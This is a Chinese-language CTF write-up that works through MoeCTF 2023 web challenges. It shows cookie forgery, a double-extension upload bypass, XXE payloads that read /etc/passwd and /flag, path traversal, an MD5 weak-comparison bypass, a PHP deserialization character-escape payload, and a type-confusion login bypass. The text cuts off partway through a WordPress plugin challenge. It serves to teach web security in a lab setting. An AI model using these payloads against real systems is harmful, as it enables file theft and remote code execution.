## web 入门指北

```
666c61673d6257396c5933526d6533637a62454e7662575666564739666257396c5131524758316379596c396a61474673624756755a3055684958303d
这是一串16进制编码，解码得到
flag=bW9lY3Rme3czbENvbWVfVG9fbW9lQ1RGX1cyYl9jaGFsbGVuZ0UhIX0=
flag的内容解码得到
moectf{w3lCome_To_moeCTF_W2b_challengE!!}
```

## http

使用Postman完成以下操作：

(Key:Value)

Params中设置UwU:u
Body中设置form-data Luv:u
右上角cookie打开后修改guest为admin
设置Headers中
X-Forwarded-For:127.0.0.1
再设置一个新的User-Agent:MoeBrowser

至此完成所有任务了

## 彼岸的flag

F12查看页面源码，找到撤回处即可找到flag

## cookie

by koito


```python
from requests import *
api_base = "http://localhost:8000/"

get(api_base+"status").json()
```




    {'error': 'ok', 'data': {'status': 'everything is ok'}}



首先不知道用户名和密码，但是有个`register`接口，那就注册一个，然后再尝试登录


```python
resp = post(api_base+"register",json={"username":"1","password":""})
resp.cookies.items(), resp.json()
```




    ([], {'error': 'ok', 'data': {'status': 'ok'}})




```python
resp = post(api_base+"login",json={"username":"1","password":""})
resp.cookies.items(), resp.json()
```




    ([('token',
       'eyJ1c2VybmFtZSI6ICIxIiwgInBhc3N3b3JkIjogIiIsICJyb2xlIjogInVzZXIifQ==')],
     {'error': 'ok', 'data': {'status': 'ok'}})



这个token一眼base64,解个码试试看
```json
{"username": "1", "password": "", "role": "user"}
```
把role改成admin,再试一次


```python
from base64 import *
get(api_base+"flag",cookies={
    "token":b64encode(b'{"username":"1","password":"","role":"admin"}').decode()
}).json()
```




    {'error': 'ok',
     'data': {'flag': 'moectf{cooKi3_is_d3licious_MA9iVff90SSJ!!M6Mrfu9ifxi9i!JGofMJ36D9cPMxro}'}}

## gas!gas!gas!

写脚本完成任务（实际上允许的时间间隔是5s）
这里使用的是油猴脚本

```javascript
// ==UserScript==
// @name         moe2023 gasgasgas Exp
// @namespace    http://tampermonkey.net/
// @version      0.1
// @description  try to take over the world!
// @author       You
// @match        http://localhost:52142
// @icon         https://www.google.com/s2/favicons?sz=64&domain=xidian.edu.cn
// @grant        none
// ==/UserScript==

(function() {
    'use strict';
    var hint = document.getElementById("info").textContent;
    if(!hint){
        return;
    }
    console.log(hint);

    var steeringControlSelect = document.getElementById("steering_control");
    var throttleSelect = document.getElementById("throttle");
    var driverInput = document.getElementById("driver");
    driverInput.value = "hacker";

    if (hint.includes("弯道向右")) {
        steeringControlSelect.value = "-1";
    } else if (hint.includes("弯道向左")) {
        steeringControlSelect.value = "1";
    } else {
        steeringControlSelect.value = "0";
    }

    if (hint.includes("抓地力太小了")) {
        throttleSelect.value = "0";
    } else if (hint.includes("抓地力太大了")) {
        throttleSelect.value = "2";
    } else {
        throttleSelect.value = "1";
    }
})();
```

## moe图床

访问uploads.php发现给了源码

```php
<?php
$targetDir = 'uploads/';
$allowedExtensions = ['png'];


if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['file'])) {
    $file = $_FILES['file'];
    $tmp_path = $_FILES['file']['tmp_name'];

    if ($file['type'] !== 'image/png') {
        die(json_encode(['success' => false, 'message' => '文件类型不符合要求']));
    }

    if (filesize($tmp_path) > 512 * 1024) {
        die(json_encode(['success' => false, 'message' => '文件太大']));
    }

    $fileName = $file['name'];
    $fileNameParts = explode('.', $fileName);

    if (count($fileNameParts) >= 2) {
        $secondSegment = $fileNameParts[1];
        if ($secondSegment !== 'png') {
            die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));
        }
    } else {
        die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));
    }

    $uploadFilePath = dirname(__FILE__) . '/' . $targetDir . basename($file['name']);

    if (move_uploaded_file($tmp_path, $uploadFilePath)) {
        die(json_encode(['success' => true, 'file_path' => $uploadFilePath]));
    } else {
        die(json_encode(['success' => false, 'message' => '文件上传失败']));
    }
}
else{
    highlight_file(__FILE__);
}
?>
```

在这里发现了有问题的后缀过滤代码：
```php
$fileNameParts = explode('.', $fileName);

    if (count($fileNameParts) >= 2) {
        $secondSegment = $fileNameParts[1];
        if ($secondSegment !== 'png') {
            die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));
        }
    } else {
        die(json_encode(['success' => false, 'message' => '文件后缀不符合要求']));
    }
```
上传image/png文件类型、png文件头、后缀为.png.php的文件即可绕过，随后执行php代码

## 了解你的座驾

**代理burp**

很多小伙伴们吐槽burp抓不到本地包

我使用burp community的时候也出现了这个问题，一顿折腾也解决不了；
所以我安装了burp pro并使用其提供的浏览器进行抓包解决了此问题

-----

抓包发现在浏览汽车的时候传递了xml：

```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:7777
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 68
Origin: http://127.0.0.1:7777
Connection: close
Referer: http://127.0.0.1:7777/index.php
Upgrade-Insecure-Requests: 1

xml_content=%3Cxml%3E%3Cname%3EMazda+rx7-FD%3C%2Fname%3E%3C%2Fxml%3E
```

解urlencode得到

```
xml_content=<xml><name>Mazda+rx7-FD</name></xml>
```

可以看到传输了xml获取马自达rx7的信息

尝试利用xxe任意文件读取

[https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files](https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files)

```
Insert the following external entity definition in between the XML declaration and the stockCheck element:
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
Replace the productId number with a reference to the external entity: &xxe;. The response should contain "Invalid product ID:" followed by the contents of the /etc/passwd file.
```

根据提示flag在根目录下，把这里的payload修改一下

```
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///flag"> ]> <xml><name>&xxe;</name></xml>
```

编码：
```http
POST /index.php HTTP/1.1
Host: 127.0.0.1:7777
Content-Length: 161
Cache-Control: max-age=0
sec-ch-ua: "Not=A?Brand";v="99", "Chromium";v="118"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
Origin: http://127.0.0.1:7777
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:7777/index.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Connection: close

xml_content=%3C!DOCTYPE%20test%20%5B%20%3C!ENTITY%20xxe%20SYSTEM%20%22file%3A%2F%2F%2Fflag%22%3E%20%5D%3E%20%3Cxml%3E%3Cname%3E%26xxe%3B%3C%2Fname%3E%3C%2Fxml%3E
```

得到flag

## 大海捞针

根据提示可知要在1000个页面中找到聊天记录里撤回了flag的那一个，自行编写脚本搜索即可

~~题目源码里可以看见彩蛋是怎么生成的~~

## meo图床

此题并不是文件上传漏洞，而是简单的路径穿越和一些php代码审计

上传一个图片后查看时访问的网址`http://127.0.0.1:7777/images.php?name=abc.jpg`

尝试访问`127.0.0.1:7777/images.php?name=../../../flag`

返回了一个无法查看的图片，使用burp抓包

```http
HTTP/1.1 200 OK
Date: Fri, 27 Oct 2023 05:05:39 GMT
Server: Apache/2.4.25 (Debian)
X-Powered-By: PHP/7.2.19
Content-Length: 118
Connection: close
Content-Type: image/png

hello~
Flag Not Here~
Find Somewhere Else~


<!--Fl3g_n0t_Here_dont_peek!!!!!.php-->

Not Here~~~~~~~~~~~~~ awa
```

访问这个`Fl3g_n0t_Here_dont_peek!!!!!.php`

```php
<?php

highlight_file(__FILE__);

if (isset($_GET['param1']) && isset($_GET['param2'])) {
    $param1 = $_GET['param1'];
    $param2 = $_GET['param2'];

    if ($param1 !== $param2) {
        
        $md5Param1 = md5($param1);
        $md5Param2 = md5($param2);

        if ($md5Param1 == $md5Param2) {
            echo "O.O!! " . getenv("FLAG");
        } else {
            echo "O.o??";
        }
    } else {
        echo "o.O?";
    }
} else {
    echo "O.o?";
}

?> O.o?
```

可以看到此处进行md5弱比较，使用科学计数法绕过得到flag

**?> O.O!!**

## 夺命十三枪

打开看到：

```php
<?php
highlight_file(__FILE__);

require_once('Hanxin.exe.php');

$Chant = isset($_GET['chant']) ? $_GET['chant'] : '夺命十三枪';

$new_visitor = new Omg_It_Is_So_Cool_Bring_Me_My_Flag($Chant);

$before = serialize($new_visitor);
$after = Deadly_Thirteen_Spears::Make_a_Move($before);
echo 'Your Movements: ' . $after . '<br>';

try{
    echo unserialize($after);
}catch (Exception $e) {
    echo "Even Caused A Glitch...";
}
?>
Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:{s:5:"Chant";s:15:"夺命十三枪";s:11:"Spear_Owner";s:6:"Nobody";}
Far away from COOL...
```

尝试访问`Hanxin.exe.php`

给出了源码

```php
<?php

if (basename($_SERVER['SCRIPT_FILENAME']) === basename(__FILE__)) {
    highlight_file(__FILE__);
}

class Deadly_Thirteen_Spears{
    private static $Top_Secret_Long_Spear_Techniques_Manual = array(
        "di_yi_qiang" => "Lovesickness",
        "di_er_qiang" => "Heartbreak",
        "di_san_qiang" => "Blind_Dragon",
        "di_si_qiang" => "Romantic_charm",
        "di_wu_qiang" => "Peerless",
        "di_liu_qiang" => "White_Dragon",
        "di_qi_qiang" => "Penetrating_Gaze",
        "di_ba_qiang" => "Kunpeng",
        "di_jiu_qiang" => "Night_Parade_of_a_Hundred_Ghosts",
        "di_shi_qiang" => "Overlord",
        "di_shi_yi_qiang" => "Letting_Go",
        "di_shi_er_qiang" => "Decisive_Victory",
        "di_shi_san_qiang" => "Unrepentant_Lethality"
    );

    public static function Make_a_Move($move){
        foreach(self::$Top_Secret_Long_Spear_Techniques_Manual as $index => $movement){
            $move = str_replace($index, $movement, $move);
        }
        return $move;
    }
}

class Omg_It_Is_So_Cool_Bring_Me_My_Flag{

    public $Chant = '';
    public $Spear_Owner = 'Nobody';

    function __construct($chant){
        $this->Chant = $chant;
        $this->Spear_Owner = 'Nobody';
    }

    function __toString(){
        if($this->Spear_Owner !== 'MaoLei'){
            return 'Far away from COOL...';
        }
        else{
            return "Omg You're So COOOOOL!!! " . getenv('FLAG');
        }
    }
}

?>
```

看起来这是夺命十三枪的功法

本题考查序列化的字符逃逸

我们需要篡改 `Omg_It_Is_So_Cool_Bring_Me_My_Flag` 类，将长枪（Spear）交给猫雷（MaoLei）

php对类的序列化请自行上网查询

字符串逃逸通过字符替换导致的payload长度变化挤出了序列化的字符串导致可以替换成可控的内容

`O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:{s:5:"Chant";s:15:"夺命十三枪";s:11:"Spear_Owner";s:6:"Nobody";}`

需要将其修改成：

`O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:{s:5:"Chant";s:15:"夺命十三枪";s:11:"Spear_Owner";s:6:"MaoLei";}`

payload:

`di_jiu_qiangdi_qi_qiangdi_qi_qiangdi_qi_qiang";s:11:"Spear_Owner";s:6:"MaoLei";}`

使用一记【百鬼夜行】还有三招【望穿】连击，持枪者【Nobody】败下阵来，长枪由【MaoLei】接手！

`Your Movements: O:34:"Omg_It_Is_So_Cool_Bring_Me_My_Flag":2:{s:5:"Chant";s:80:"Night_Parade_of_a_Hundred_GhostsPenetrating_GazePenetrating_GazePenetrating_Gaze";s:11:"Spear_Owner";s:6:"MaoLei";}";s:11:"Spear_Owner";s:6:"Nobody";}
Omg You're So COOOOOL!!!`

**Omg You're So COOOOOL!!!**

## signin

by koito (wp by Klutton)

题目给出附件，有main.py

```python
from secrets import users, salt
import hashlib
import base64
import json
import http.server

with open("flag.txt","r") as f:
    FLAG = f.read().strip()

def gethash(*items):
    c = 0
    for item in items:
        if item is None:
            continue
        c ^= int.from_bytes(hashlib.md5(f"{salt}[{item}]{salt}".encode()).digest(), "big") # it looks so complex! but is it safe enough?
    return hex(c)[2:]

assert "admin" in users
assert users["admin"] == "admin"

hashed_users = dict((k,gethash(k,v)) for k,v in users.items())

eval(int.to_bytes(0x636d616f686e69656e61697563206e6965756e63696165756e6320696175636e206975616e6363616361766573206164^8651845801355794822748761274382990563137388564728777614331389574821794036657729487047095090696384065814967726980153,160,"big",signed=True).decode().translate({ord(c):None for c in "\x00"})) # what is it?
    
def decrypt(data:str):
        for x in range(5):
            data = base64.b64encode(data).decode() # ummm...? It looks like it's just base64 encoding it 5 times? truely?
        return data

__page__ = base64.b64encode("PCFET0NUWVBFIGh0bWw+CjxodG1sPgo8aGVhZD4KICAgIDx0aXRsZT5zaWduaW48L3RpdGxlPgogICAgPHNjcmlwdD4KICAgICAgICBbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoK3t9K1tdKVsrISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXVtbXV0rW10pWytbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoW10rW11bKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyghIVtdK1tdKVsrISFbXV0rKCEhW10rW10pWytbXV1dWyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoW10re30pWyshIVtdXSsoW11bW11dK1tdKVsrISFbXV0rKCFbXStbXSlbIStbXSshIVtdKyEhW11dKyghIVtdK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbK1tdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXV0oKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKFtdW1tdXStbXSlbK1tdXSsoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKygre30rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKVshK1tdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKShbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdW1tdXStbXSlbIStbXSshIVtdKyEhW11dKyghW10rW10pWyErW10rISFbXSshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyhbXStbXVsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKCEhW10rW10pWyshIVtdXSsoISFbXStbXSlbK1tdXV1bKFtdK3t9KVshK1tdKyEhW10rISFbXSshIVtdKyEhW11dKyhbXSt7fSlbKyEhW11dKyhbXVtbXV0rW10pWyshIVtdXSsoIVtdK1tdKVshK1tdKyEhW10rISFbXV0rKCEhW10rW10pWytbXV0rKCEhW10rW10pWyshIVtdXSsoW11bW11dK1tdKVsrW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW10re30pWyshIVtdXSsoISFbXStbXSlbKyEhW11dXSgoISFbXStbXSlbKyEhW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdXSsoISFbXStbXSlbK1tdXSsoW11bW11dK1tdKVsrW11dKyghIVtdK1tdKVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKCFbXStbXSlbIStbXSshIVtdXSsoW10re30pWyshIVtdXSsoW10re30pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKCt7fStbXSlbKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXVtbXV0rW10pWyErW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVsrISFbXV0rKFtdW1tdXStbXSlbKyEhW11dKSghK1tdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXSkpWyErW10rISFbXSshIVtdXSsoW11bW11dK1tdKVshK1tdKyEhW10rISFbXV0pKCErW10rISFbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10pKChbXSt7fSlbK1tdXSlbK1tdXSsoIStbXSshIVtdKyEhW10rW10pKyhbXVtbXV0rW10pWyErW10rISFbXV0pKyhbXSt7fSlbIStbXSshIVtdKyEhW10rISFbXSshIVtdKyEhW10rISFbXV0rKFtdK3t9KVshK1tdKyEhW11dKyghIVtdK1tdKVsrW11dKyhbXSt7fSlbKyEhW11dKygre30rW10pWyshIVtdXSkoIStbXSshIVtdKyEhW10rISFbXSkKICAgICAgICB2YXIgXzB4ZGI1ND1bJ3N0cmluZ2lmeScsJ2xvZycsJ3Bhc3N3b3JkJywnL2xvZ2luJywnUE9TVCcsJ2dldEVsZW1lbnRCeUlkJywndGhlbiddO3ZhciBfMHg0ZTVhPWZ1bmN0aW9uKF8weGRiNTRmYSxfMHg0ZTVhOTQpe18weGRiNTRmYT1fMHhkYjU0ZmEtMHgwO3ZhciBfMHg0ZDhhNDQ9XzB4ZGI1NFtfMHhkYjU0ZmFdO3JldHVybiBfMHg0ZDhhNDQ7fTt3aW5kb3dbJ2FwaV9iYXNlJ109Jyc7ZnVuY3Rpb24gbG9naW4oKXtjb25zb2xlW18weDRlNWEoJzB4MScpXSgnbG9naW4nKTt2YXIgXzB4NWYyYmViPWRvY3VtZW50W18weDRlNWEoJzB4NScpXSgndXNlcm5hbWUnKVsndmFsdWUnXTt2YXIgXzB4NGZkMjI2PWRvY3VtZW50W18weDRlNWEoJzB4NScpXShfMHg0ZTVhKCcweDInKSlbJ3ZhbHVlJ107dmFyIF8weDFjNjFkOT1KU09OW18weDRlNWEoJzB4MCcpXSh7J3VzZXJuYW1lJzpfMHg1ZjJiZWIsJ3Bhc3N3b3JkJzpfMHg0ZmQyMjZ9KTt2YXIgXzB4MTBiOThlPXsncGFyYW1zJzphdG9iKGF0b2IoYXRvYihhdG9iKGF0b2IoXzB4MWM2MWQ5KSkpKSl9O2ZldGNoKHdpbmRvd1snYXBpX2Jhc2UnXStfMHg0ZTVhKCcweDMnKSx7J21ldGhvZCc6XzB4NGU1YSgnMHg0JyksJ2JvZHknOkpTT05bXzB4NGU1YSgnMHgwJyldKF8weDEwYjk4ZSl9KVtfMHg0ZTVhKCcweDYnKV0oZnVuY3Rpb24oXzB4Mjk5ZDRkKXtjb25zb2xlW18weDRlNWEoJzB4MScpXShfMHgyOTlkNGQpO30pO30KICAgIDwvc2NyaXB0Pgo8L2hlYWQ+Cjxib2R5PgogICAgPGgxPmV6U2lnbmluPC9oMT4KICAgIDxwPlNpZ24gaW4gdG8geW91ciBhY2NvdW50PC9wPgogICAgPHA+ZGVmYXVsdCB1c2VybmFtZSBhbmQgcGFzc3dvcmQgaXMgYWRtaW4gYWRtaW48L3A+CiAgICA8cD5Hb29kIEx1Y2shPC9wPgoKICAgIDxwPgogICAgICAgIHVzZXJuYW1lIDxpbnB1dCBpZD0idXNlcm5hbWUiPgogICAgPC9wPgogICAgPHA+CiAgICAgICAgcGFzc3dvcmQgPGlucHV0IGlkPSJwYXNzd29yZCIgdHlwZT0icGFzc3dvcmQiPgogICAgPC9wPgogICAgPGJ1dHRvbiBpZCA9ICJsb2dpbiI+CiAgICAgICAgTG9naW4KICAgIDwvYnV0dG9uPgo8L2JvZHk+CjxzY3JpcHQ+CiAgICBjb25zb2xlLmxvZygiaGVsbG8/IikKICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJsb2dpbiIpLmFkZEV2ZW50TGlzdGVuZXIoImNsaWNrIiwgbG9naW4pOwo8L3NjcmlwdD4KPC9odG1sPg==")
        
class MyHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            if self.path == "/":
                self.send_response(200)
                self.end_headers()
                self.wfile.write(__page__)
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 Not Found")
        except Exception as e:
            print(e)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"500 Internal Server Error")

    def do_POST(self):
        try:
            if self.path == "/login":
                body = self.rfile.read(int(self.headers.get("Content-Length")))
                payload = json.loads(body)
                params = json.loads(decrypt(payload["params"]))
                print(params)
                if params.get("username") == "admin":
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b"YOU CANNOT LOGIN AS ADMIN!")
                    print("admin")
                    return
                if params.get("username") == params.get("password"):
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!")
                    print("same")
                    return
                hashed = gethash(params.get("username"),params.get("password"))
                for k,v in hashed_users.items():
                    if hashed == v:
                        data = {
                            "user":k,
                            "hash":hashed,
                            "flag": FLAG if k == "admin" else "flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}"
                        }
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(json.dumps(data).encode())
                        print("success")
                        return
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b"Invalid username or password")
            else:
                self.send_response(404)
                self.end_headers()
                self.wfile.write(b"404 Not Found")
        except Exception as e:
            print(e)
            self.send_response(500)
            self.end_headers()
            self.wfile.write(b"500 Internal Server Error")

if __name__ == "__main__":
    server = http.server.HTTPServer(("", 9999), MyHandler)
    server.serve_forever()
```

将eval代码处的int_to_bytes运行即可得知出题人翻转了base64的编码和解码（即使不知道也可以直接硬解base64编码后的内容，解开即可获取index网页（用处不大））

登录逻辑：

```python
if self.path == "/login":
                body = self.rfile.read(int(self.headers.get("Content-Length")))
                payload = json.loads(body)
                params = json.loads(decrypt(payload["params"]))
                print(params)
                if params.get("username") == "admin":
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b"YOU CANNOT LOGIN AS ADMIN!")
                    print("admin")
                    return
                if params.get("username") == params.get("password"):
                    self.send_response(403)
                    self.end_headers()
                    self.wfile.write(b"YOU CANNOT LOGIN WITH SAME USERNAME AND PASSWORD!")
                    print("same")
                    return
                hashed = gethash(params.get("username"),params.get("password"))
                for k,v in hashed_users.items():
                    if hashed == v:
                        data = {
                            "user":k,
                            "hash":hashed,
                            "flag": FLAG if k == "admin" else "flag{YOU_HAVE_TO_LOGIN_IN_AS_ADMIN_TO_GET_THE_FLAG}"
                        }
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(json.dumps(data).encode())
                        print("success")
                        return
                self.send_response(403)
                self.end_headers()
                self.wfile.write(b"Invalid username or password")
```

在确认了json里username和password不能相同后，经过一个hash函数

```python
def gethash(*items):
    c = 0
    for item in items:
        if item is None:
            continue
        c ^= int.from_bytes(hashlib.md5(f"{salt}[{item}]{salt}".encode()).digest(), "big") # it looks so complex! but is it safe enough?
    return hex(c)[2:]
```

返回的内容消除了类型限制，因此使用不同类型的username和password即可，例如

`{"username": "1", "password": 1}`

经过decrypt函数的五次base64后post的内容为：

`{"params":"VjJ4b2MxTXdNVmhVV0d4WFltMTRjRmxzVm1GTlJtUnpWR3R3VDJFeWVFVlZNV2h2VTIxR1dWcEhOVlJXZWxaRVdWVmtUbVZzVW5GVWJXeE9UVWhDZVZVeFpIZGtiRzkzVFZac1RsSkVRVGs9 " }`

## 出去旅游的心海

本题是静态环境，环境自动重置

访问题目地址，有一个假的flag和一个wordpress网站；进入网站

在`写了个有趣的功能！`帖子中提示会记录访问者的信息并计入数据库

*如果你使用了科学上网会发现右边显示了你访问时使用的ip等信息*

页面审计发现js代码

```javascript
<script>
async function submitVisitorData() {
  try {
    const response = await fetch('http://ip-api.com/json/');
    const ipData = await response.json();

    if (ipData.status === 'success') {
      const ip = ipData.query;
      const country = ipData.country;
      const city = ipData.city;

      const formData = new FormData();
      formData.append('ip', ip);
      formData.append('user-agent', navigator.userAgent);
      
      const dateTime = new Date().toISOString().slice(0, 19).replace('T', ' ');
      formData.append('time', dateTime);

      const infoList = document.createElement('ul');
      infoList.innerHTML = `<li>IP地址: ${ip}</li><li>国家: ${country}</li><li>城市: ${city}</li><li>User Agent: ${navigator.userAgent}</li><li>平台: ${navigator.platform}</li><li>操作系统语言: ${navigator.language}</li><li>访问时间: ${dateTime}</li>`;
      const para = document.createElement('p');
      para.innerHTML = `记到小本本里了~`;
      document.querySelector('.wp-container-1').appendChild(infoList);
      document.querySelector('.wp-container-1').appendChild(para);

      //记到小本本里~
      await fetch('wp-content/plugins/visitor-logging/logger.php', {
        method: 'POST',
        body: formData
      });

    } else {
      console.error('获取IP信息失败');
    }
  } catch (error) {
    console.error('获取IP信息时出错:', error);
  }
}

submitVisitorData();
</script>
```

发现提交信息到`wp-content/plugins/visitor-logging/logger.php`，访问，源码已经给出

```php
 <?php
/*
Plugin Name: Visitor auto recorder
Description: Automatically record visitor's identification, still in development, do not use in industry environment!
Author: KoKoMi
  Still in development! :)
*/

// 不许偷看！这些代码我还在调试呢！
highlight_file(__FILE__);

// 加载数据库配置，暂时用硬编码绝对路径
require_once('/var/www/html/wordpress/' . 'wp-config.php');

$db_user = DB_USER; // 数据库用户名
$db_password = DB_PASSWORD; // 数据库密码
$db_name = DB_NAME; // 数据库名称
$db_host = DB_HOST; // 数据库主机

// 我记得可以用wp提供的global $wpdb来操作数据库，等旅游回来再研究一下
// 这些是临时的代码

$ip = $_POST['ip'];
$user_agent = $_POST['user_agent'];
$time = stripslashes($_POST['time']);

$mysqli = new mysqli($db_host, $db_user, $db_password, $db_name);

// 检查连接是否成功
if ($mysqli->connect_errno) {
    echo '数据库连接失败: ' . $mysqli->connect_error;
    exit();
}

